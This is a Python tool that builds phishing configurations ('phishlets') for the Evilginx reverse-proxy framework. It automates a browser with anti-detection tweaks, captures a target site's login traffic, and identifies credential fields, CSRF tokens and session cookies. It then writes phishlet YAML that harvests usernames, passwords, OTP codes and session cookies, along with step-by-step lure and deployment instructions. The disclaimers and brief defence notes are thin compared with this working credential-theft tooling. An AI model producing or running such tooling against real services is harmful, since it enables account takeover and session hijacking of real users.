#!/usr/bin/env python3
"""
Universal Phishlet Generator - Supports Evilginx 1, 2, and 3
Author: Ethical Hacking Student
Usage: python3 phishletgen_universal.py
"""

import argparse
import sys
import time
import json
import yaml
import re
import os
from urllib.parse import urlparse, urljoin, parse_qs
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException
from browsermobproxy import Server
import colorama
from colorama import Fore, Style
import threading
import queue

colorama.init()

class UniversalPhishletGenerator:
    def __init__(self):
        self.target_url = ""
        self.evilginx_version = ""
        self.parsed_url = None
        self.domain = ""
        self.base_domain = ""
        
        # Data storage
        self.login_endpoints = []
        self.form_fields = {}
        self.cookies = []
        self.redirects = []
        self.subdomains = set()
        self.js_files = []
        self.proxy_hosts = []
        self.auth_tokens = []
        self.csrf_tokens = []
        
        # BrowserMob Proxy
        self.proxy = None
        self.driver = None
        self.har_queue = queue.Queue()
        
    def display_banner(self):
        """Display tool banner"""
        banner = f"""
{Fore.CYAN}
╔══════════════════════════════════════════════════════════════════╗
║               EVILGEN - UNIVERSAL PHISHLET GENERATOR             ║
║                    Evilginx 1/2/3 Compatible                     ║
╠══════════════════════════════════════════════════════════════════╣
║  WARNING: For authorized security testing and education ONLY     ║
║  Use only in isolated lab environments you own or control        ║
╚══════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
        """
        print(banner)
    
    def interactive_setup(self):
        """Interactive setup wizard"""
        print(f"\n{Fore.YELLOW}[*] Interactive Setup Wizard{Style.RESET_ALL}")
        
        # Get target URL
        while True:
            url = input(f"\n{Fore.CYAN}[?] Target login URL (e.g., https://example.com/login): {Style.RESET_ALL}")
            if url.startswith(('http://', 'https://')):
                self.target_url = url
                self.parsed_url = urlparse(url)
                self.domain = self.parsed_url.netloc
                
                # Extract base domain (remove subdomains)
                parts = self.domain.split('.')
                if len(parts) > 2:
                    self.base_domain = '.'.join(parts[-2:])
                else:
                    self.base_domain = self.domain
                break
            else:
                print(f"{Fore.RED}[!] URL must start with http:// or https://{Style.RESET_ALL}")
        
        # Get Evilginx version
        print(f"\n{Fore.CYAN}[?] Select Evilginx version:{Style.RESET_ALL}")
        print("  1) Evilginx 1.x (legacy)")
        print("  2) Evilginx 2.x (common)")
        print("  3) Evilginx 3.x (latest)")
        
        while True:
            choice = input(f"{Fore.CYAN}[>] Enter choice (1-3): {Style.RESET_ALL}")
            if choice in ['1', '2', '3']:
                self.evilginx_version = choice
                break
            else:
                print(f"{Fore.RED}[!] Invalid choice{Style.RESET_ALL}")
        
        # Get analysis depth
        print(f"\n{Fore.CYAN}[?] Analysis depth:{Style.RESET_ALL}")
        print("  1) Basic (form detection only)")
        print("  2) Standard (form + traffic analysis)")
        print("  3) Advanced (form + traffic + JS analysis)")
        
        self.analysis_depth = input(f"{Fore.CYAN}[>] Enter choice (1-3, default 2): {Style.RESET_ALL}") or "2"
        
        return True
    
    def start_proxy(self):
        """Start BrowserMob Proxy for traffic interception"""
        print(f"\n{Fore.CYAN}[*] Starting BrowserMob Proxy...{Style.RESET_ALL}")
        
        # Try to find browsermob-proxy
        possible_paths = [
            './browsermob-proxy-2.1.4/bin/browsermob-proxy',
            './browsermob-proxy/bin/browsermob-proxy',
            '/usr/local/bin/browsermob-proxy',
            '/opt/browsermob-proxy/bin/browsermob-proxy'
        ]
        
        proxy_path = None
        for path in possible_paths:
            if os.path.exists(path):
                proxy_path = path
                break
        
        if not proxy_path:
            print(f"{Fore.YELLOW}[!] BrowserMob Proxy not found. Attempting to download...{Style.RESET_ALL}")
            try:
                import requests
                import zipfile
                
                # Download BrowserMob Proxy
                url = "https://github.com/lightbody/browsermob-proxy/releases/download/browsermob-proxy-2.1.4/browsermob-proxy-2.1.4-bin.zip"
                print(f"[*] Downloading BrowserMob Proxy...")
                response = requests.get(url, stream=True)
                with open("browsermob-proxy.zip", "wb") as f:
                    for chunk in response.iter_content(chunk_size=8192):
                        f.write(chunk)
                
                # Extract
                with zipfile.ZipFile("browsermob-proxy.zip", 'r') as zip_ref:
                    zip_ref.extractall(".")
                
                proxy_path = "./browsermob-proxy-2.1.4/bin/browsermob-proxy"
                os.chmod(proxy_path, 0o755)
                print(f"{Fore.GREEN}[+] BrowserMob Proxy downloaded{Style.RESET_ALL}")
                
            except Exception as e:
                print(f"{Fore.RED}[!] Could not download BrowserMob Proxy: {e}{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}[!] Continuing without traffic analysis...{Style.RESET_ALL}")
                return False
        
        try:
            self.proxy_server = Server(proxy_path)
            self.proxy_server.start()
            self.proxy = self.proxy_server.create_proxy()
            
            # Configure proxy
            self.proxy.new_har("login_analysis", options={
                'captureHeaders': True,
                'captureContent': True,
                'captureBinaryContent': True
            })
            
            print(f"{Fore.GREEN}[+] Proxy started on port {self.proxy.port}{Style.RESET_ALL}")
            return True
            
        except Exception as e:
            print(f"{Fore.RED}[!] Failed to start proxy: {e}{Style.RESET_ALL}")
            return False
    
    def setup_browser(self, use_proxy=True):
        """Configure browser with optional proxy"""
        print(f"{Fore.CYAN}[*] Configuring browser...{Style.RESET_ALL}")
        
        options = webdriver.ChromeOptions()
        
        if use_proxy and self.proxy:
            options.add_argument(f'--proxy-server=127.0.0.1:{self.proxy.port}')
        
        options.add_argument('--ignore-certificate-errors')
        options.add_argument('--allow-running-insecure-content')
        options.add_argument('--disable-web-security')
        options.add_argument('--disable-blink-features=AutomationControlled')
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        
        # Remove automation flags
        options.add_experimental_option("excludeSwitches", ["enable-automation"])
        options.add_experimental_option('useAutomationExtension', False)
        
        try:
            self.driver = webdriver.Chrome(options=options)
            
            # Execute CDP commands
            self.driver.execute_cdp_cmd('Network.enable', {})
            self.driver.execute_cdp_cmd('Page.addScriptToEvaluateOnNewDocument', {
                'source': '''
                    Object.defineProperty(navigator, 'webdriver', {
                        get: () => undefined
                    });
                    window.chrome = { runtime: {} };
                '''
            })
            
            print(f"{Fore.GREEN}[+] Browser configured{Style.RESET_ALL}")
            return True
            
        except Exception as e:
            print(f"{Fore.RED}[!] Browser setup failed: {e}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[!] Make sure Chrome and chromedriver are installed{Style.RESET_ALL}")
            return False
    
    def analyze_page_structure(self):
        """Analyze the login page DOM structure"""
        print(f"\n{Fore.CYAN}[*] Analyzing page structure...{Style.RESET_ALL}")
        
        # Wait for page to load
        time.sleep(3)
        
        try:
            # Get page title
            title = self.driver.title
            print(f"{Fore.YELLOW}[i] Page title: {title}{Style.RESET_ALL}")
            
            # Get all forms
            forms = self.driver.find_elements(By.TAG_NAME, 'form')
            print(f"{Fore.GREEN}[+] Found {len(forms)} form(s){Style.RESET_ALL}")
            
            for i, form in enumerate(forms):
                self.analyze_form(form, i)
                
            # Look for alternative login methods
            self.find_alternative_login_methods()
            
            # Extract JavaScript information
            if self.analysis_depth in ['2', '3']:
                self.analyze_javascript()
            
            return True
            
        except Exception as e:
            print(f"{Fore.RED}[!] Page analysis error: {e}{Style.RESET_ALL}")
            return False
    
    def analyze_form(self, form, form_index):
        """Analyze a single form element"""
        try:
            form_data = {
                'action': form.get_attribute('action') or '',
                'method': form.get_attribute('method') or 'get',
                'id': form.get_attribute('id'),
                'class': form.get_attribute('class'),
                'fields': []
            }
            
            # Get all input fields
            inputs = form.find_elements(By.TAG_NAME, 'input')
            for inp in inputs:
                field_info = {
                    'name': inp.get_attribute('name') or '',
                    'type': inp.get_attribute('type') or 'text',
                    'id': inp.get_attribute('id') or '',
                    'placeholder': inp.get_attribute('placeholder') or '',
                    'value': inp.get_attribute('value') or ''
                }
                form_data['fields'].append(field_info)
                
                # Classify field
                self.classify_field(field_info)
            
            # Get all button elements
            buttons = form.find_elements(By.TAG_NAME, 'button')
            for btn in buttons:
                btn_type = btn.get_attribute('type') or 'submit'
                btn_text = btn.text or btn.get_attribute('value') or ''
                
                form_data['fields'].append({
                    'name': '',
                    'type': 'button',
                    'button_type': btn_type,
                    'text': btn_text
                })
            
            print(f"\n{Fore.YELLOW}[i] Form {form_index + 1}:{Style.RESET_ALL}")
            print(f"    Action: {form_data['action']}")
            print(f"    Method: {form_data['method']}")
            
            if form_data['fields']:
                print(f"    Fields:")
                for field in form_data['fields']:
                    if field['name']:
                        print(f"      - {field['name']} ({field['type']})")
            
            # Store form data
            self.login_endpoints.append({
                'form_index': form_index,
                'url': urljoin(self.target_url, form_data['action']),
                'method': form_data['method'].upper(),
                'fields': form_data['fields']
            })
            
        except Exception as e:
            print(f"{Fore.RED}[!] Error analyzing form: {e}{Style.RESET_ALL}")
    
    def classify_field(self, field_info):
        """Classify form field type"""
        name_lower = field_info['name'].lower()
        type_lower = field_info['type'].lower()
        
        # Username/email fields
        username_patterns = ['user', 'email', 'login', 'account', 'name']
        if any(pattern in name_lower for pattern in username_patterns) or type_lower == 'email':
            self.form_fields['username'] = field_info['name'] or 'username'
            print(f"{Fore.GREEN}[+] Username field: {field_info['name']}{Style.RESET_ALL}")
        
        # Password fields
        password_patterns = ['pass', 'pwd', 'secret']
        if any(pattern in name_lower for pattern in password_patterns) or type_lower == 'password':
            self.form_fields['password'] = field_info['name'] or 'password'
            print(f"{Fore.GREEN}[+] Password field: {field_info['name']}{Style.RESET_ALL}")
        
        # CSRF tokens
        csrf_patterns = ['csrf', 'token', 'authenticity', 'nonce', 'state']
        if any(pattern in name_lower for pattern in csrf_patterns):
            self.csrf_tokens.append(field_info['name'])
            print(f"{Fore.GREEN}[+] CSRF token field: {field_info['name']}{Style.RESET_ALL}")
        
        # Submit buttons
        if type_lower in ['submit', 'button']:
            self.form_fields['submit'] = field_info['name'] or 'submit'
    
    def find_alternative_login_methods(self):
        """Find OAuth, SSO, or alternative login methods"""
        try:
            # Look for OAuth buttons
            oauth_selectors = [
                "a[href*='oauth']",
                "a[href*='auth']",
                "button:contains('Google')",
                "button:contains('Facebook')",
                "button:contains('GitHub')",
                "button:contains('Login with')",
                "button:contains('Sign in with')"
            ]
            
            for selector in oauth_selectors:
                elements = self.driver.find_elements(By.CSS_SELECTOR, selector)
                for elem in elements:
                    href = elem.get_attribute('href') or ''
                    text = elem.text or ''
                    if href or text:
                        print(f"{Fore.YELLOW}[i] Alternative login found: {text} -> {href}{Style.RESET_ALL}")
                        
        except Exception as e:
            print(f"{Fore.RED}[!] Error finding alternative logins: {e}{Style.RESET_ALL}")
    
    def analyze_javascript(self):
        """Analyze JavaScript files and inline scripts"""
        try:
            # Get external JS files
            scripts = self.driver.find_elements(By.TAG_NAME, 'script')
            for script in scripts:
                src = script.get_attribute('src')
                if src:
                    self.js_files.append(src)
            
            # Look for authentication-related JS
            auth_keywords = ['auth', 'login', 'oauth', 'token', 'session', 'jwt']
            for js_file in self.js_files:
                if any(keyword in js_file.lower() for keyword in auth_keywords):
                    print(f"{Fore.GREEN}[+] Auth-related JS: {js_file}{Style.RESET_ALL}")
            
        except Exception as e:
            print(f"{Fore.RED}[!] JS analysis error: {e}{Style.RESET_ALL}")
    
    def monitor_traffic(self, duration=30):
        """Monitor network traffic during manual interaction"""
        if not self.proxy:
            print(f"{Fore.YELLOW}[!] No proxy available, skipping traffic analysis{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.CYAN}[*] Monitoring network traffic for {duration} seconds...{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[i] Please manually interact with the login page in the browser{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[i] Try to log in with test credentials (use your own test account){Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[i] Browser will remain open for {duration} seconds{Style.RESET_ALL}")
        
        # Start monitoring thread
        monitor_thread = threading.Thread(target=self.traffic_monitor_thread)
        monitor_thread.daemon = True
        monitor_thread.start()
        
        # Wait for user interaction
        time.sleep(duration)
        
        # Analyze captured traffic
        self.analyze_captured_traffic()
    
    def traffic_monitor_thread(self):
        """Thread to monitor traffic in background"""
        try:
            while True:
                if self.proxy:
                    har = self.proxy.har
                    if har and 'log' in har and 'entries' in har['log']:
                        self.har_queue.put(har['log']['entries'][-5:])  # Last 5 entries
                time.sleep(1)
        except:
            pass
    
    def analyze_captured_traffic(self):
        """Analyze captured HAR data"""
        if not self.proxy:
            return
        
        try:
            har_data = self.proxy.har
            
            for entry in har_data['log']['entries']:
                request = entry['request']
                response = entry['response']
                url = request['url']
                
                # Extract domain info
                parsed = urlparse(url)
                if self.base_domain in parsed.netloc:
                    self.subdomains.add(parsed.netloc)
                
                # Look for login endpoints
                if request['method'] == 'POST':
                    post_data = request.get('postData', {})
                    mime_type = post_data.get('mimeType', '')
                    
                    # Check if this is a login request
                    login_keywords = ['login', 'auth', 'signin', 'authenticate']
                    if any(keyword in url.lower() for keyword in login_keywords) or 'password' in str(post_data).lower():
                        print(f"{Fore.GREEN}[+] Login endpoint found: {url}{Style.RESET_ALL}")
                        
                        # Extract POST parameters
                        if mime_type == 'application/x-www-form-urlencoded':
                            params = parse_qs(post_data.get('text', ''))
                            for key in params:
                                if 'pass' in key.lower():
                                    self.form_fields['password'] = key
                                elif any(kw in key.lower() for kw in ['user', 'email', 'login']):
                                    self.form_fields['username'] = key
                
                # Look for cookies
                for header in response.get('headers', []):
                    if header['name'].lower() == 'set-cookie':
                        self.parse_cookie(header['value'], parsed.netloc)
                
                # Look for redirects
                if 300 <= response['status'] < 400:
                    for header in response.get('headers', []):
                        if header['name'].lower() == 'location':
                            self.redirects.append(header['value'])
            
        except Exception as e:
            print(f"{Fore.RED}[!] Traffic analysis error: {e}{Style.RESET_ALL}")
    
    def parse_cookie(self, cookie_str, domain):
        """Parse Set-Cookie header"""
        try:
            cookie_parts = cookie_str.split(';')
            name_value = cookie_parts[0].split('=')
            if len(name_value) >= 2:
                cookie_name = name_value[0].strip()
                
                # Check if we already have this cookie
                existing = [c for c in self.cookies if c['name'] == cookie_name]
                if not existing:
                    cookie_data = {
                        'name': cookie_name,
                        'domain': domain,
                        'httponly': 'HttpOnly' in cookie_str,
                        'secure': 'Secure' in cookie_str,
                        'session': 'Expires' not in cookie_str
                    }
                    
                    # Parse expiration
                    for part in cookie_parts:
                        if 'expires=' in part.lower():
                            cookie_data['expires'] = part.split('=', 1)[1].strip()
                    
                    self.cookies.append(cookie_data)
                    print(f"{Fore.GREEN}[+] Cookie found: {cookie_name} (HttpOnly: {cookie_data['httponly']}){Style.RESET_ALL}")
                    
        except Exception as e:
            print(f"{Fore.RED}[!] Cookie parse error: {e}{Style.RESET_ALL}")
    
    def generate_evilginx1_phishlet(self):
        """Generate Evilginx 1.x compatible phishlet"""
        phishlet = {
            'name': self.base_domain.replace('.', '_'),
            'author': 'UniversalPhishletGenerator',
            'version': '1.0',
            'proxy_pass': f'https://{self.base_domain}',
            'proxy_host': self.base_domain,
            'phish_sub': 'login',
            'keys': [],
            'login': {
                'path': self.parsed_url.path,
                'username_key': self.form_fields.get('username', 'username'),
                'password_key': self.form_fields.get('password', 'password')
            }
        }
        
        # Add cookies as keys
        for cookie in self.cookies:
            phishlet['keys'].append(cookie['name'])
        
        # Add CSRF tokens if found
        for csrf in self.csrf_tokens:
            phishlet['keys'].append(csrf)
        
        return phishlet
    
    def generate_evilginx2_phishlet(self):
        """Generate Evilginx 2.x compatible phishlet"""
        phishlet = {
            'name': self.base_domain.replace('.', '_'),
            'author': 'UniversalPhishletGenerator',
            'min_ver': '2.3',
            'proxy_hosts': [],
            'sub_filters': [],
            'auth_tokens': [],
            'login': {},
            'credentials': {}
        }
        
        # Generate proxy_hosts
        subdomains_list = list(self.subdomains) if self.subdomains else [self.base_domain]
        for subdomain in subdomains_list:
            phish_sub = subdomain.split('.')[0] if '.' in subdomain else 'www'
            orig_sub = subdomain.replace(f'.{self.base_domain}', '')
            if orig_sub == subdomain:
                orig_sub = 'www'
            
            phishlet['proxy_hosts'].append({
                'phish_sub': phish_sub,
                'orig_sub': orig_sub,
                'domain': self.base_domain,
                'session': True,
                'is_landing': ('login' in phish_sub or 'auth' in phish_sub or 'account' in phish_sub)
            })
        
        # Generate sub_filters
        domain_regex = re.escape(self.base_domain)
        phishlet['sub_filters'].append({
            'domain': self.base_domain,
            'sub': '.*',
            'mimes': ['text/html', 'application/javascript', 'text/css'],
            'regexp': f'(https?://)((www|login|auth|account|secure)\\.)?{domain_regex}',
            'redirect': 'https://{hostname}',
            'replace': '$1{hostname}'
        })
        
        # Generate auth_tokens
        if self.cookies:
            cookie_domains = set(c['domain'] for c in self.cookies)
            for cookie_domain in cookie_domains:
                keys = [c['name'] for c in self.cookies if c['domain'] == cookie_domain]
                if keys:
                    phishlet['auth_tokens'].append({
                        'domain': f'.{self.base_domain}' if cookie_domain == self.base_domain else cookie_domain,
                        'keys': keys
                    })
        
        # Generate login section
        if self.login_endpoints:
            endpoint = self.login_endpoints[0]
            phishlet['login'] = {
                'domain': self.base_domain,
                'path': urlparse(endpoint['url']).path,
                'username_field': self.form_fields.get('username', 'username'),
                'password_field': self.form_fields.get('password', 'password'),
                'submit_field': self.form_fields.get('submit', ''),
                'capture_fields': []
            }
        else:
            phishlet['login'] = {
                'domain': self.base_domain,
                'path': self.parsed_url.path,
                'username_field': self.form_fields.get('username', 'username'),
                'password_field': self.form_fields.get('password', 'password'),
                'submit_field': '',
                'capture_fields': []
            }
        
        # Generate credentials section
        phishlet['credentials'] = {
            'username': {
                'key': self.form_fields.get('username', 'username'),
                'search': '(?i)(email|username|login|user|account)',
                'type': 'post'
            },
            'password': {
                'key': self.form_fields.get('password', 'password'),
                'search': '(?i)(password|pass|pwd|secret)',
                'type': 'post'
            }
        }
        
        # Add CSRF tokens to credentials if found
        for csrf in self.csrf_tokens:
            phishlet['credentials'][f'csrf_{csrf}'] = {
                'key': csrf,
                'search': f'(?i){re.escape(csrf)}',
                'type': 'post'
            }
        
        return phishlet
    
    def generate_evilginx3_phishlet(self):
        """Generate Evilginx 3.x compatible phishlet"""
        phishlet = {
            'name': self.base_domain.replace('.', '_'),
            'author': 'UniversalPhishletGenerator',
            'description': f'Phishlet for {self.base_domain}',
            'min_ver': '3.0.0',
            'proxy_hosts': [],
            'transformations': [],
            'credentials': {},
            'tokens': [],
            'landing_paths': []
        }
        
        # Generate proxy_hosts (different format in v3)
        subdomains_list = list(self.subdomains) if self.subdomains else [self.base_domain]
        for subdomain in subdomains_list:
            host_entry = {
                'phish_sub': subdomain.split('.')[0] if '.' in subdomain else '',
                'orig_sub': subdomain.replace(f'.{self.base_domain}', ''),
                'domain': self.base_domain
            }
            
            # Mark as landing if it's a login subdomain
            if any(x in subdomain.lower() for x in ['login', 'auth', 'account', 'secure']):
                host_entry['is_landing'] = True
                phishlet['landing_paths'].append(self.parsed_url.path)
            
            phishlet['proxy_hosts'].append(host_entry)
        
        # Generate transformations (replaces sub_filters)
        domain_regex = re.escape(self.base_domain)
        phishlet['transformations'].append({
            'type': 'regex',
            'target': 'response',
            'content_type': ['text/html', 'application/javascript'],
            'pattern': f'(https?://)((www|login|auth|account)\\.)?{domain_regex}',
            'replacement': 'https://{hostname}'
        })
        
        # Transform form actions
        phishlet['transformations'].append({
            'type': 'regex',
            'target': 'response',
            'content_type': ['text/html'],
            'pattern': 'action=["\'][^"\']*["\']',
            'replacement': 'action="/"'
        })
        
        # Generate tokens (replaces auth_tokens)
        for cookie in self.cookies:
            token_entry = {
                'type': 'cookie',
                'name': cookie['name'],
                'domain': f'.{self.base_domain}',
                'match': '.*',
                'capture': True
            }
            phishlet['tokens'].append(token_entry)
        
        # Generate credentials
        phishlet['credentials'] = {
            'username': {
                'key': self.form_fields.get('username', 'username'),
                'patterns': [
                    {'type': 'post', 'pattern': '(?i)(email|username|login)'},
                    {'type': 'json', 'pattern': '(?i)(user|login).*name'}
                ]
            },
            'password': {
                'key': self.form_fields.get('password', 'password'),
                'patterns': [
                    {'type': 'post', 'pattern': '(?i)(password|pass|pwd)'},
                    {'type': 'json', 'pattern': '(?i)pass'}
                ]
            }
        }
        
        # Add 2FA support if detected
        if self.analysis_depth == '3':
            phishlet['credentials']['otp_code'] = {
                'key': 'otp_code',
                'patterns': [
                    {'type': 'post', 'pattern': '(?i)(otp|code|2fa|totp|verification)'}
                ]
            }
        
        return phishlet
    
    def generate_phishlet(self):
        """Generate phishlet based on selected Evilginx version"""
        print(f"\n{Fore.CYAN}[*] Generating Evilginx {self.evilginx_version}.x phishlet...{Style.RESET_ALL}")
        
        if self.evilginx_version == '1':
            phishlet = self.generate_evilginx1_phishlet()
            filename = f"{self.base_domain.replace('.', '_')}_v1.yaml"
        elif self.evilginx_version == '2':
            phishlet = self.generate_evilginx2_phishlet()
            filename = f"{self.base_domain.replace('.', '_')}_v2.yaml"
        else:  # version 3
            phishlet = self.generate_evilginx3_phishlet()
            filename = f"{self.base_domain.replace('.', '_')}_v3.yaml"
        
        # Save to file
        self.save_phishlet(phishlet, filename)
        
        # Also generate installation instructions
        self.generate_instructions(filename, phishlet)
        
        return filename, phishlet
    
    def save_phishlet(self, phishlet, filename):
        """Save phishlet to YAML file"""
        with open(filename, 'w') as f:
            # Write header
            f.write(f"# Auto-generated phishlet for {self.base_domain}\n")
            f.write(f"# Generated by UniversalPhishletGenerator\n")
            f.write(f"# Target URL: {self.target_url}\n")
            f.write(f"# Evilginx version: {self.evilginx_version}.x\n")
            f.write(f"# Time: {time.ctime()}\n")
            f.write(f"# Use only in authorized lab environments\n\n")
            
            # Write YAML content
            yaml.dump(phishlet, f, default_flow_style=False, sort_keys=False, allow_unicode=True)
        
        print(f"{Fore.GREEN}[+] Phishlet saved to: {filename}{Style.RESET_ALL}")
    
    def generate_instructions(self, filename, phishlet):
        """Generate installation and usage instructions"""
        instr_file = filename.replace('.yaml', '_instructions.txt')
        
        instructions = f"""
=== PHISHLET INSTALLATION INSTRUCTIONS ===
Generated: {time.ctime()}
Target: {self.target_url}
Evilginx Version: {self.evilginx_version}.x
Phishlet: {filename}

1. COPY PHISHLET:
   sudo cp {filename} /usr/local/share/evilginx/phishlets/
   
2. START EVILGINX:
   sudo evilginx

3. CONFIGURE:
"""

        if self.evilginx_version == '1':
            instructions += f"""
   > set domain your-phishing-domain.com
   > set ip 127.0.0.1
   > phishlet load {phishlet['name']}
   > phishlet enable {phishlet['name']}
"""
        elif self.evilginx_version == '2':
            instructions += f"""
   > config domain your-phishing-domain.com
   > config ip 127.0.0.1
   > phishlets hostname {phishlet['name']} your-phishing-domain.com
   > phishlets enable {phishlet['name']}
"""
        else:  # version 3
            instructions += f"""
   > config domain your-phishing-domain.com
   > config ip 127.0.0.1
   > phishlets import {filename}
   > phishlets enable {phishlet['name']}
"""

        instructions += f"""
4. CREATE LURE:
   > lures create {phishlet['name']}
   > lures get-url 0

5. TEST IN LAB:
   - Use the generated URL in your victim VM
   - Monitor sessions in Evilginx
   - Test session hijacking

=== DETECTION & DEFENSE NOTES ===
This attack can be detected by:
1. Certificate pinning
2. FIDO2/WebAuthn authentication
3. Monitoring for domain anomalies
4. User training on URL inspection

=== ETHICAL USE REMINDER ===
This phishlet is for:
- Authorized penetration testing
- Security research and education
- Defensive security training
- Isolated lab environments only

NEVER use against systems you don't own or have explicit permission to test.
"""

        with open(instr_file, 'w') as f:
            f.write(instructions)
        
        print(f"{Fore.GREEN}[+] Instructions saved to: {instr_file}{Style.RESET_ALL}")
    
    def display_summary(self, filename, phishlet):
        """Display generation summary"""
        print(f"\n{Fore.GREEN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}GENERATION COMPLETE!{Style.RESET_ALL}")
        print(f"{Fore.GREEN}{'='*60}{Style.RESET_ALL}")
        
        print(f"\n{Fore.YELLOW}SUMMARY:{Style.RESET_ALL}")
        print(f"  Target URL:     {self.target_url}")
        print(f"  Base Domain:    {self.base_domain}")
        print(f"  Evilginx:       Version {self.evilginx_version}.x")
        print(f"  Output File:    {filename}")
        
        print(f"\n{Fore.YELLOW}DETECTED ELEMENTS:{Style.RESET_ALL}")
        print(f"  Login Forms:    {len(self.login_endpoints)}")
        print(f"  Form Fields:    {len(self.form_fields)}")
        print(f"  Cookies:        {len(self.cookies)}")
        print(f"  CSRF Tokens:    {len(self.csrf_tokens)}")
        print(f"  Subdomains:     {len(self.subdomains)}")
        
        print(f"\n{Fore.YELLOW}CREDENTIAL FIELDS:{Style.RESET_ALL}")
        for key, value in self.form_fields.items():
            print(f"  {key}: {value}")
        
        if self.cookies:
            print(f"\n{Fore.YELLOW}COOKIES TO CAPTURE:{Style.RESET_ALL}")
            for cookie in self.cookies:
                print(f"  - {cookie['name']} (HttpOnly: {cookie['httponly']})")
        
        print(f"\n{Fore.YELLOW}NEXT STEPS:{Style.RESET_ALL}")
        print("  1. Review and edit the generated phishlet")
        print("  2. Test in isolated lab environment")
        print("  3. Implement defenses against this attack")
        
        print(f"\n{Fore.RED}IMPORTANT:{Style.RESET_ALL}")
        print("  This tool is for authorized security testing only.")
        print("  Always have written permission before testing.")
        print("  Document all testing activities for compliance.")
    
    def cleanup(self):
        """Clean up resources"""
        print(f"\n{Fore.CYAN}[*] Cleaning up...{Style.RESET_ALL}")
        
        try:
            if self.driver:
                self.driver.quit()
                print(f"{Fore.GREEN}[+] Browser closed{Style.RESET_ALL}")
        except:
            pass
        
        try:
            if self.proxy_server:
                self.proxy_server.stop()
                print(f"{Fore.GREEN}[+] Proxy stopped{Style.RESET_ALL}")
        except:
            pass
    
    def run(self):
        """Main execution flow"""
        try:
            self.display_banner()
            
            # Interactive setup
            if not self.interactive_setup():
                return
            
            # Start proxy (optional)
            proxy_started = False
            if self.analysis_depth in ['2', '3']:
                proxy_started = self.start_proxy()
            
            # Setup browser
            if not self.setup_browser(use_proxy=proxy_started):
                print(f"{Fore.RED}[!] Browser setup failed. Exiting.{Style.RESET_ALL}")
                return
            
            # Navigate to target
            print(f"\n{Fore.CYAN}[*] Navigating to target...{Style.RESET_ALL}")
            self.driver.get(self.target_url)
            
            # Analyze page
            self.analyze_page_structure()
            
            # Monitor traffic if proxy is available
            if proxy_started and self.analysis_depth in ['2', '3']:
                self.monitor_traffic(duration=45)
            
            # Generate phishlet
            filename, phishlet = self.generate_phishlet()
            
            # Display summary
            self.display_summary(filename, phishlet)
            
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[!] Interrupted by user{Style.RESET_ALL}")
        except Exception as e:
            print(f"\n{Fore.RED}[!] Error: {str(e)}{Style.RESET_ALL}")
            import traceback
            traceback.print_exc()
        finally:
            self.cleanup()

def main():
    """Main entry point"""
    generator = UniversalPhishletGenerator()
    generator.run()

if __name__ == "__main__":
    main()
